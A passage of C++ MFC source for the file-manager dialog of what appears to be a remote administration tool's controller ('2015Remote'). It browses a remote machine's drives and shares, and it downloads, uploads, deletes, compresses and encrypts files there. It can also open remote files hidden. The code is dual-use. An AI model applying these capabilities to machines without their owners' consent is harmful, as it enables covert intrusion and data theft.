// FileManagerDlg.cpp : implementation file
#include "stdafx.h"
#include "2015Remote.h"
#include "CFileManagerDlg.h"
#include "CFileTransferModeDlg.h"

#include "InputDlg.h"
#include <windows.h>
#include <Shlwapi.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

static UINT indicators[] = {
    ID_SEPARATOR,           // status line indicator
    ID_SEPARATOR,
    ID_SEPARATOR
};

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog

using namespace file;

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, Server* pIOCPServer, ClientContext* pContext)
    : DialogBase(CFileManagerDlg::IDD, pParent, pIOCPServer, pContext, IDI_File)
{
    m_ProgressCtrl = nullptr;
    m_SearchStr = _T("");
    m_bSubFordle = FALSE;
    id_search_result = 0;

    // 保存远程驱动器列表
    m_bCanAdmin = (*m_ContextObject->m_DeCompressionBuffer.GetBuffer(1)) == 0x01;
    m_strDesktopPath = (TCHAR*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(2);
    memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
    memcpy(m_bRemoteDriveList, m_ContextObject->m_DeCompressionBuffer.GetBuffer(1 + 1 + (m_strDesktopPath.GetLength() + 1) * sizeof(TCHAR)),
           m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1 - 1 - (m_strDesktopPath.GetLength() + 1) * sizeof(TCHAR));

    m_bUseAdmin = false;
    m_hFileSend = INVALID_HANDLE_VALUE;
    m_hFileRecv = INVALID_HANDLE_VALUE;
    m_nTransferMode = TRANSFER_MODE_NORMAL;
    m_nOperatingFileLength = 0;
    m_nCounter = 0;
    m_bIsStop = false;

    DRIVE_Sys = FALSE;
    DRIVE_CAZ = FALSE;
    Bf_nCounters = 0;// 备份计数器  由于比较用
    Bf_dwOffsetHighs = 0;
    Bf_dwOffsetLows = 0;

    m_bDragging = FALSE;
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
    DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
    DDX_Control(pDX, IDC_LIST_REMOTE_DRIVER, m_list_remote_driver);

    DDX_Control(pDX, IDC_BTN_SEARCH, m_BtnSearch);
    DDX_Text(pDX, IDC_EDT_SEARCHSTR, m_SearchStr);
    DDX_Check(pDX, IDC_CK_SUBFORDLE, m_bSubFordle);
    DDX_Control(pDX, IDC_LIST_REMOTE_SEARCH, m_list_remote_search);
}

BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
    ON_WM_QUERYDRAGICON()
    ON_WM_SIZE()
    ON_WM_MOUSEMOVE()
    ON_WM_LBUTTONUP()
    ON_WM_TIMER()
    ON_WM_CLOSE()

    ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE_DRIVER, OnDblclkListRemotedriver)	//主1   双击
    ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, OnDblclkListRemote)				//主    双击
    ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE_DRIVER, OnRclickListRemotedriver)	//主1    右键
    ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, OnRclickListRemote)				//主    右键
    ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE_SEARCH, OnRclickListSearch)		//搜索  右键

    ON_NOTIFY(NM_CLICK, IDC_LIST_REMOTE_DRIVER, OnclkListRemotedriver)	//主1   单击
    ON_NOTIFY(NM_CLICK, IDC_LIST_REMOTE, OnclkListRemote)				//主    单击
    ON_NOTIFY(NM_CLICK, IDC_LIST_REMOTE_SEARCH, OnclickListSearch)		//搜索  单击

    ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, OnEndLabelEditListRemote)
    ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, OnBeginDragListRemote)

    ON_COMMAND(IDT_REMOTE_VIEW, OnRemoteView) //显示方式
    ON_COMMAND(IDT_REMOTE_PREV, OnRemotePrev) //向上
    ON_COMMAND(IDT_REMOTE_STOP, OnRemoteStop) //取消
    ON_BN_CLICKED(IDC_BUTTON_GO, OnGo)
    ON_COMMAND(IDM_RENAME, OnRename)
    ON_COMMAND(IDM_DELETE, OnDelete)
    ON_COMMAND(IDM_DELETE_ENFORCE, OnDeleteEnforce)
    ON_COMMAND(IDM_NEWFOLDER, OnNewFolder)
    ON_COMMAND(IDM_USE_ADMIN, OnUseAdmin)
    ON_COMMAND(IDM_REMOTE_OPEN_SHOW, OnRemoteOpenShow)
    ON_COMMAND(IDM_REMOTE_OPEN_HIDE, OnRemoteOpenHide)
    ON_COMMAND(IDM_GET_FILEINFO, OnRemoteInfo)
    ON_COMMAND(ID_FILEMANGER_Encryption, OnRemoteEncryption)
    ON_COMMAND(ID_FILEMANGER_decrypt, OnRemoteDecrypt)
    ON_COMMAND(ID_FILEMANGER_COPY, OnRemoteCopyFile)
    ON_COMMAND(ID_FILEMANGER_PASTE, OnRemotePasteFile)
    ON_COMMAND(ID_FILEMANGER_ZIP, OnRemotezip)
    ON_COMMAND(ID_FILEMANGER_ZIP_STOP, OnRemotezipstop)

    ON_COMMAND(IDM_COMPRESS, OnCompress)
    ON_COMMAND(IDM_UNCOMPRESS, OnUncompress)
    ON_COMMAND(IDM_REFRESH, OnRefresh)
    ON_COMMAND(IDM_TRANSFER_S, OnTransferSend)
    ON_COMMAND(IDM_TRANSFER_R, OnTransferRecv)
    ON_CBN_SETFOCUS(IDC_REMOTE_PATH, OnSetfocusRemotePath)
    ON_BN_CLICKED(IDC_BTN_SEARCH, OnBtnSearch)
    ON_BN_CLICKED(ID_SEARCH_STOP, OnBnClickedSearchStop)
    ON_BN_CLICKED(ID_SEARCH_RESULT, OnBnClickedSearchResult)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg message handlers

BOOL CFileManagerDlg::MyShell_GetImageLists()
{
    I_ImageList0.DeleteImageList();
    I_ImageList0.Create(32, 32, ILC_COLOR32 | ILC_MASK, 2, 2);
    I_ImageList0.SetBkColor(::GetSysColor(COLOR_BTNFACE));

    I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_A));
    I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_C));
    I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_D));
    I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_E));
    I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_F));
    I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_G));

    I_ImageList1.DeleteImageList();
    I_ImageList1.Create(16, 16, ILC_COLOR32 | ILC_MASK, 2, 2);
    I_ImageList1.SetBkColor(::GetSysColor(COLOR_BTNFACE));
    I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_A));
    I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_C));
    I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_D));
    I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_E));
    I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_F));
    I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_G));
    m_list_remote_driver.SetImageList(&I_ImageList0, LVSIL_NORMAL);
    m_list_remote_driver.SetImageList(&I_ImageList1, LVSIL_SMALL);
    return TRUE;
}

BOOL CFileManagerDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    RECT	rect;
    GetClientRect(&rect);

    // 设置标题
    CString str;
    str.Format(_T("文件管理 - %s"), m_ContextObject->PeerName.c_str()), SetWindowText(str);

    // 创建带进度条的状态栏
    if (!m_wndStatusBar.Create(this) ||
        !m_wndStatusBar.SetIndicators(indicators,
                                      sizeof(indicators) / sizeof(UINT))) {
        TRACE0("Failed to create status bar\n");
        return -1;      // fail to create
    }

    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 100);
    m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 210);
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏

    m_wndStatusBar.GetItemRect(1, &rect);
    m_ProgressCtrl = new CProgressCtrl;
    m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
    m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
    m_ProgressCtrl->SetPos(0);                 //设置进度条当前位置

    SHAutoComplete(GetDlgItem(IDC_REMOTE_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);

    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    MyShell_GetImageLists();

    m_list_remote_driver.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_ONECLICKACTIVATE | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES | LVS_SHAREIMAGELISTS);
    m_list_remote.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_ONECLICKACTIVATE | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES | LVS_SHAREIMAGELISTS);
    m_list_remote_search.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_ONECLICKACTIVATE | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES | LVS_SHAREIMAGELISTS);
    
    m_list_remote.SetImageList(&(THIS_APP->m_pImageList_Large), LVSIL_NORMAL);
    m_list_remote.SetImageList(&(THIS_APP->m_pImageList_Small), LVSIL_SMALL);

    m_list_remote_search.SetImageList(&(THIS_APP->m_pImageList_Large), LVSIL_NORMAL);
    m_list_remote_search.SetImageList(&(THIS_APP->m_pImageList_Small), LVSIL_SMALL);

    m_list_remote_driver.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 50);
    m_list_remote_driver.InsertColumn(1, _T("类型"), LVCFMT_LEFT, 38);
    m_list_remote_driver.InsertColumn(2, _T("总大小"), LVCFMT_LEFT, 70);
    m_list_remote_driver.InsertColumn(3, _T("可用空间"), LVCFMT_LEFT, 70);

    m_list_remote.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 250);
    m_list_remote.InsertColumn(1, _T("大小"), LVCFMT_LEFT, 70);
    m_list_remote.InsertColumn(2, _T("类型"), LVCFMT_LEFT, 120);
    m_list_remote.InsertColumn(3, _T("修改日期"), LVCFMT_LEFT, 115);
    m_list_remote.SetParenDlg(this);

    //设置搜索list表头
    m_list_remote_search.ShowWindow(SW_HIDE);
    m_list_remote_search.InsertColumn(0, _T("文件名"), LVCFMT_LEFT, 130);
    m_list_remote_search.InsertColumn(1, _T("大小"), LVCFMT_LEFT, 100);
    m_list_remote_search.InsertColumn(2, _T("修改日期"), LVCFMT_LEFT, 100);
    m_list_remote_search.InsertColumn(3, _T("文件路径"), LVCFMT_LEFT, 450);
    SetWindowPos(NULL, 0, 0, 830, 500, SWP_NOMOVE);

    FixedRemoteDriveList();

    return TRUE;
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialog::OnSize(nType, cx, cy);

    // TODO: Add your message handler code here
    // 状态栏还没有创建
    if (m_wndStatusBar.m_hWnd == NULL)
        return;
    // 定位状态栏
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏
    RECT	rect;
    m_wndStatusBar.GetItemRect(1, &rect);
    m_ProgressCtrl->MoveWindow(&rect);
}

void CFileManagerDlg::OnBeginDragListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
    //We will call delete later (in LButtonUp) to clean this up

    if (m_list_remote.GetSelectedCount() > 1) //选择了列表中的超过 1 个项目
        m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
    else
        m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

    ASSERT(m_hCursor);
    m_bDragging = TRUE;
    SetCapture();
    *pResult = 0;
}

void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
    if (m_bDragging) {
        m_bDragging = FALSE;
        BOOL bDownload = FALSE;
        SetCursor(LoadCursor(NULL, IDC_NO));

        TCHAR str[1024] = TEXT("c:\\");
        HWND hwnd = NULL;
        POINT pNow = { 0,0 };
        if (GetCursorPos(&pNow)) // 获取鼠标当前位置
            mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, pNow.x, pNow.y, 0, 0);
        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, pNow.x, pNow.y, 0, 0);
        Sleep(150);
        HWND hwndPointNow = NULL;
        hwndPointNow = ::WindowFromPoint(pNow); // 获取鼠标所在窗口的句柄
        TCHAR szBuf_class[MAX_PATH];
        TCHAR szBuf_title[MAX_PATH];
        ::GetWindowText(hwndPointNow, szBuf_title, MAX_PATH);
        GetClassName(hwndPointNow, szBuf_class, MAX_PATH);
        if ((lstrcmp(szBuf_class, _T("SysListView32")) == 0) && (lstrcmp(szBuf_title, _T("FolderView")) == 0)) {
            TCHAR DeskTopPath[255];
            SHGetSpecialFolderPath(0, DeskTopPath, CSIDL_DESKTOPDIRECTORY, 0);
            strLpath = DeskTopPath;
            bDownload = TRUE;
        } else {
            GetClassName(hwndPointNow, szBuf_class, MAX_PATH);
            if ((lstrcmp(szBuf_class, _T("DirectUIHWND")) == 0)) {
                hwnd = ::FindWindowEx(NULL, NULL, TEXT("CabinetWClass"), NULL);
                hwnd = ::FindWindowEx(hwnd, NULL, TEXT("WorkerW"), NULL);
                hwnd = ::FindWindowEx(hwnd, NULL, TEXT("ReBarWindow32"), NULL);

                hwnd = ::FindWindowEx(hwnd, NULL, TEXT("ComboBoxEx32"), NULL);  //XP
                if (hwnd == NULL) {
                    hwnd = ::FindWindowEx(NULL, NULL, TEXT("CabinetWClass"), NULL);
                    hwnd = ::FindWindowEx(hwnd, NULL, TEXT("WorkerW"), NULL);
                    hwnd = ::FindWindowEx(hwnd, NULL, TEXT("ReBarWindow32"), NULL);
                    hwnd = ::FindWindowEx(hwnd, NULL, TEXT("Address Band Root"), NULL);
                    hwnd = ::FindWindowEx(hwnd, NULL, TEXT("msctls_progress32"), NULL);

                    hwnd = ::FindWindowEx(hwnd, NULL, TEXT("Breadcrumb Parent"), NULL);
                    hwnd = ::FindWindowEx(hwnd, NULL, TEXT("ToolbarWindow32"), NULL);
                }

                if (hwnd == NULL) {
                    ::MessageBox(NULL, _T("请拖拽到文件管理器选定目录中"), TEXT("错误"), 0);
                } else {
                    ::SendMessage(hwnd, WM_GETTEXT, 1024, (LPARAM)str);
                    strLpath = str + 4;
                    bDownload = TRUE;
                }
            }
        }
        if (bDownload) {
            m_bIsUpload = false;
            // 禁用文件管理窗口
            EnableControl(FALSE);

            CString	file;
            m_Remote_Download_Job.RemoveAll();
            POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
            while (pos) {
                int nItem = m_list_remote.GetNextSelectedItem(pos);
                file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
                // 如果是目录
                if (m_list_remote.GetItemData(nItem))
                    file += '\\';
                m_Remote_Download_Job.AddTail(file);
            }
            if (file.IsEmpty()) {
                EnableControl(TRUE);
                ::MessageBox(m_hWnd, _T("请选择文件！"), _T("警告"), MB_OK | MB_ICONWARNING);
                return;
            }

            if (strLpath == _T("")) {
                EnableControl(TRUE);
                return;
            }
            if (strLpath.GetAt(strLpath.GetLength() - 1) != _T('\\'))
                strLpath += _T("\\");
            m_nTransferMode = TRANSFER_MODE_NORMAL;
            // 发送第一个下载任务
            SendDownloadJob();
        }
    }
    CDialog::OnLButtonUp(nFlags, point);
}


BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{
    if (pMsg->message == WM_KEYDOWN) {
        if (pMsg->wParam == VK_ESCAPE)
            return true;
        if (pMsg->wParam == VK_RETURN) {
            if (pMsg->hwnd == m_list_remote.m_hWnd ||
                pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd) {
                GetRemoteFileList();
            }
            return TRUE;
        }
    }
    // 单击除了窗口标题栏以外的区域使窗口移动
    if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd) {
        pMsg->message = WM_NCLBUTTONDOWN;
        pMsg->wParam = HTCAPTION;
    }

    return CDialog::PreTranslateMessage(pMsg);
}

void CFileManagerDlg::OnTimer(UINT_PTR nIDEvent)
{
    // TODO: Add your message handler code here and/or call default
    m_ProgressCtrl->StepIt();
    CDialog::OnTimer(nIDEvent);
}

void CFileManagerDlg::FixedRemoteDriveList()
{
    // 加载系统统图标列表 设置驱动器图标列表
    //加载系统图标

    DRIVE_Sys = FALSE;
    BYTE* pDrive = NULL;
    pDrive = (BYTE*)m_bRemoteDriveList;
    int		 count = 0;
    int		AmntMB = 0; // 总大小
    int		FreeMB = 0; // 剩余空间

    /*
    6	DRIVE_FLOPPY
    7	DRIVE_REMOVABLE
    8	DRIVE_FIXED
    9	DRIVE_REMOTE
    10	DRIVE_REMOTE_DISCONNECT
    11	DRIVE_CDROM
    */
    int	nIconIndex = -1;
    //用一个循环遍历所有发送来的信息，先是到列表中
    for (int i = 0; pDrive[i] != '\0';) {
        //由驱动器名判断图标的索引
        if (pDrive[i] == _T('A') || pDrive[i] == _T('B')) {
            nIconIndex = 0;
        } else {
            switch (pDrive[i + 2]) {
            case DRIVE_REMOVABLE:
                nIconIndex = 3;
                break;
            case DRIVE_FIXED:
                if (!DRIVE_Sys) {
                    DRIVE_Sys = TRUE;
                    nIconIndex = 1;
                } else
                    nIconIndex = 2;
                break;
            case DRIVE_REMOTE:
                nIconIndex = 4;
                break;
            case DRIVE_CDROM:
                nIconIndex = 5;
                break;
            default:
                nIconIndex = 2;
                break;
            }
        }
        //显示驱动器名
        CString	str;
        str.Format(_T("%c:\\"), pDrive[i]);
        int	nItem = m_list_remote_driver.InsertItem(i, str, nIconIndex);
        m_list_remote_driver.SetItemData(nItem, 1);
        //显示驱动器大小
        memcpy(&AmntMB, pDrive + i + 4, 4);
        memcpy(&FreeMB, pDrive + i + 8, 4);
        str.Format(_T("%0.1f GB"), (float)AmntMB / 1024);
        m_list_remote_driver.SetItemText(nItem, 2, str);
        str.Format(_T("%0.1f GB"), (float)FreeMB / 1024);
        m_list_remote_driver.SetItemText(nItem, 3, str);

        i += 12;

        TCHAR* lpFileSystemName = NULL;
        TCHAR* lpTypeName = NULL;

        lpTypeName = (TCHAR*)(pDrive + i);
        i += (lstrlen(lpTypeName) + 1) * sizeof(TCHAR);
        lpFileSystemName = (TCHAR*)(pDrive + i);

        // 磁盘类型, 为空就显示磁盘名称
        if (lstrlen(lpFileSystemName) == 0) {
            m_list_remote_driver.SetItemText(nItem, 1, lpTypeName);
        } else {
            m_list_remote_driver.SetItemText(nItem, 1, lpFileSystemName);
        }

        i += (lstrlen(lpFileSystemName) + 1) * sizeof(TCHAR);
        count++;
    }

    m_list_remote_driver.InsertItem(0, _T("桌面"), nIconIndex);
    m_list_remote_driver.InsertItem(0, _T("最近"), nIconIndex);
    count += 2;

    // 重置远程当前路径
    m_Remote_Path = "";
    m_Remote_Directory_ComboBox.ResetContent();

    DRIVE_CAZ = FALSE;
    DWORD_PTR dwResult;
    ShowMessage(_T("远程计算机：磁盘列表"));
    SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 0, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);

    BYTE bPacket = COMMAND_FILE_GETNETHOOD;
    m_iocpServer->Send2Client(m_ContextObject, &bPacket, 1);
}

void CFileManagerDlg::fixNetHood(BYTE* pbuffer, int buffersize)
{
    CString	str;
    TCHAR* pszFileName = NULL;
    int strsize;
    DWORD	dwOffset = 0; // 位移指针
    for (int i = 0; dwOffset < buffersize - sizeof(int);) {
        memcpy(&strsize, pbuffer + dwOffset, sizeof(int));
        pszFileName = (TCHAR*)(pbuffer + dwOffset + sizeof(int));
        str = pszFileName;
        int	nItem = m_list_remote_driver.InsertItem(m_list_remote_driver.GetItemCount(), str, DRIVE_REMOTE);
        m_list_remote_driver.SetItemData(nItem, 1);
        m_list_remote_driver.SetItemText(nItem, 1, _T("共享"));
        m_list_remote_driver.SetItemText(nItem, 2, _T(""));
        m_list_remote_driver.SetItemText(nItem, 3, _T(""));
        dwOffset += (strsize + sizeof(int));
    }
}

void CFileManagerDlg::OnClose()
{
    CancelIO();
	// 等待数据处理完毕
	if (IsProcessing()) {
		ShowWindow(SW_HIDE);
		return;
	}

    DestroyCursor(m_hCursor);

    if (m_hFileSend != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hFileSend);
        m_hFileSend = INVALID_HANDLE_VALUE;
    }
    if (m_hFileRecv != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hFileRecv);
        m_hFileRecv = INVALID_HANDLE_VALUE;
    }

    int iImageCount = I_ImageList0.GetImageCount();
    for (int i = 0; i < iImageCount; i++) {
        I_ImageList0.Remove(-1);
    }
    iImageCount = I_ImageList1.GetImageCount();

    for (int i = 0; i < iImageCount; i++) {
        I_ImageList1.Remove(-1);
    }

    m_wndStatusBar.DestroyWindow();
    m_ProgressCtrl->DestroyWindow();
    SAFE_DELETE(m_ProgressCtrl);

    DialogBase::OnClose();
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
    CString	strCurPath = strPath;
    int Index = strCurPath.ReverseFind(_T('\\'));
    if (Index == -1) {
        return strCurPath;
    }
    CString str = strCurPath.Left(Index);
    Index = str.ReverseFind(_T('\\'));
    if (Index == -1) {
        strCurPath = _T("");
        return strCurPath;
    }
    strCurPath = str.Left(Index);

    if (strCurPath.Right(1) != _T("\\"))
        strCurPath += _T("\\");
    return strCurPath;
}

void CFileManagerDlg::OnReceiveComplete()
{
    if (m_bIsClosed) 	return;
    switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0]) {
    case TOKEN_FILE_LIST: // 文件列表
        FixedRemoteFileList(m_ContextObject->m_DeCompressionBuffer.GetBuffer(0), m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1);
        break;
    case TOKEN_FILE_SIZE: // 传输文件时的第一个数据包，文件大小，及文件名
        CreateLocalRecvFile();
        break;
    case TOKEN_FILE_DATA: // 文件内容
        WriteLocalRecvFile();
        break;
    case TOKEN_TRANSFER_FINISH: // 传输完成
        EndLocalRecvFile();
        break;
    case TOKEN_CREATEFOLDER_FINISH:
        GetRemoteFileList(_T("."));
        break;
    case TOKEN_DELETE_FINISH:
        EndRemoteDeleteFile();
        break;
    case TOKEN_GET_TRANSFER_MODE: //文件上传
        SendTransferMode();
        break;
    case TOKEN_DATA_CONTINUE:
        SendFileData();    //文件上传数据
        break;
    case TOKEN_RENAME_FINISH:
        // 刷新远程文件列表
        GetRemoteFileList(_T("."));
        break;
    case TOKEN_SEARCH_FILE_LIST:
        FixedRemoteSearchFileList
        (
            m_ContextObject->m_DeCompressionBuffer.GetBuffer(0),
            m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1
        );
        break;
    case TOKEN_SEARCH_FILE_FINISH:
        SearchEnd();
        break;
    case TOKEN_COMPRESS_FINISH:
        GetRemoteFileList(_T("."));
        break;
    case TOKEN_FILE_GETNETHOOD:
        fixNetHood(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1), m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1);
        break;
    case TOKEN_FILE_RECENT: {
        CString strRecent = (TCHAR*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1);
        m_Remote_Directory_ComboBox.SetWindowText(strRecent);
        m_list_remote.SetSelectionMark(-1);
        GetRemoteFileList();
    }
    break;
    case TOKEN_FILE_INFO: {
        CString szInfo = (TCHAR*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1);
        if (MessageBox(szInfo, _T("路径  确认拷贝到剪切板"), MB_ICONEXCLAMATION | MB_YESNO) == IDYES) {
            CStringA a;
            a = szInfo;
            ::OpenClipboard(::GetDesktopWindow());
            ::EmptyClipboard();
            HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, a.GetLength() + 1);
            if (hglbCopy != NULL) {
                // Lock the handle and copy the text to the buffer.
                LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
                memcpy(lptstrCopy, a.GetBuffer(), a.GetLength() + 1);
                GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.
                SetClipboardData(CF_TEXT, hglbCopy);
                GlobalFree(hglbCopy);
            }
            CloseClipboard();
        }
    }
    break;
    case TOKEN_FILE_REFRESH: {
        GetRemoteFileList(_T("."));
    }
    break;
    case TOKEN_FILE_ZIPOK: {
        GetRemoteFileList(_T("."));
        ShowMessage(_T("压缩完成"));
        MessageBox(0, _T("ZIP压缩完成"));
    }
    break;
    case TOKEN_FILE_GETINFO: {
    }
    break;

    case TOKEN_FILE_SEARCHPLUS_LIST:
        ShowSearchPlugList();
        break;
    case TOKEN_FILE_SEARCHPLUS_NONTFS: {
        DWORD_PTR dwResult;
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,(LPARAM)_T(" 驱动盘非NTFS格式"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    }
    break;
    case TOKEN_FILE_SEARCHPLUS_HANDLE: {
        DWORD_PTR dwResult;
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)_T("需要管理员权限运行"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    }
    break;
    case TOKEN_FILE_SEARCHPLUS_INITUSN: {
        DWORD_PTR dwResult;
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)_T("初始化日志文件失败"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    }
    break;
    case TOKEN_FILE_SEARCHPLUS_GETUSN: {
        DWORD_PTR dwResult;
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)_T("获取日志文件失败"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    }
    break;
    case TOKEN_FILE_SEARCHPLUS_NUMBER: {
        DWORD_PTR dwResult;
        int i;
        memcpy(&i, m_ContextObject->m_DeCompressionBuffer.GetBuffer() + 1, sizeof(int));
        CString	strMsgShow;
        strMsgShow.Format(_T("已经搜索 %d  请勿再次搜索"), i);
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)(strMsgShow.GetBuffer()), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    }
    break;

    default:
        SendException();
        break;
    }
}

void CFileManagerDlg::OnReceive()
{
}

void CFileManagerDlg::GetRemoteFileList(CString directory)
{
    if (directory.GetLength() == 0) {
        int	nItem = m_list_remote.GetSelectionMark();

        // 如果有选中的，是目录
        if (nItem != -1) {
            if (m_list_remote.GetItemData(nItem) == 1) {
                directory = m_list_remote.GetItemText(nItem, 0);
            }
        }
        // 从组合框里得到路径
        else {
            m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
        }
    }
    // 得到父目录
    if (directory == _T("..")) {
        if (m_Remote_Path.GetLength() == 3) return;

        m_Remote_Path = GetParentDirectory(m_Remote_Path);
    } else if (directory != _T(".")) {
        m_Remote_Path += directory;
        if (m_Remote_Path.GetLength() > 0 && m_Remote_Path.Right(1) != _T("\\"))
            m_Remote_Path += _T("\\");
    }

    // 是驱动器的根目录,返回磁盘列表
    if (m_Remote_Path.GetLength() == 0) {
        return;
    }

    // 发送数据前清空缓冲区
    int	PacketSize = (m_Remote_Path.GetLength() + 1) * sizeof(TCHAR) + 1;
    BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, PacketSize);

    bPacket[0] = COMMAND_LIST_FILES;
    memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
    m_iocpServer->Send2Client(m_ContextObject, bPacket, PacketSize);
    LocalFree(bPacket);

    m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
    m_Remote_Directory_ComboBox.SetCurSel(0);

    // 得到返回数据前禁窗口
    m_list_remote.EnableWindow(FALSE);
    m_list_remote_driver.EnableWindow(FALSE);

    DRIVE_CAZ = FALSE;
}

void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1) {
        //获取文件详细信息
        POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
        if (pos != NULL) {
            int nItem = m_list_remote.GetNextSelectedItem(pos);
            CString filename = m_list_remote.GetItemText(nItem, 0);
            filename = m_Remote_Path + filename;
            // 发送数据前清空缓冲区
            int	PacketSize = (filename.GetLength() + 1) * sizeof(TCHAR) + 1;
            BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, PacketSize);
